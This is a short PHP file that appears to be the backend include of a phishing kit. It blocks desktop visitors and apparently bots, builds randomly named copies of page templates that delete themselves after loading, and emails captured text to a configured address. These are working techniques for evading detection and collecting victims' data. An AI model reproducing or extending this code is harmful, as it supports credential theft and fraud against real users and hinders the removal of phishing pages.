<?php 
@session_start();
require (__DIR__).'/config.php';
require (__DIR__).'/bots/father.php';
require (__DIR__).'/md.php';
require (__DIR__).'/panel/panel.class.php';
$pnl = new Panel();
$current_data = $pnl->getData();


$detect = new Mobile_Detect;
if(!$detect->isMobile() AND strtolower($block_pc) == "yes"){
     header("location: out.php");
     exit;
}


function createPage($name){
	$new = (__dir__)."/fr/".uniqid()."-".rand(0, 99999).".php";
     $html = file_get_contents((__dir__)."/fr/source/$name.txt");
	$fp =fopen($new, "w+");
	fwrite($fp, $html);
     fwrite($fp, "<?php unlink(basename(\$_SERVER['SCRIPT_NAME'])); ?>");
	fclose($fp);
     return basename($new);
}


function sendMail($txt){
     global $email_to;
     $subject = substr($txt, 0, 34);
     @mail($email_to,  $subject, $txt);
}


?>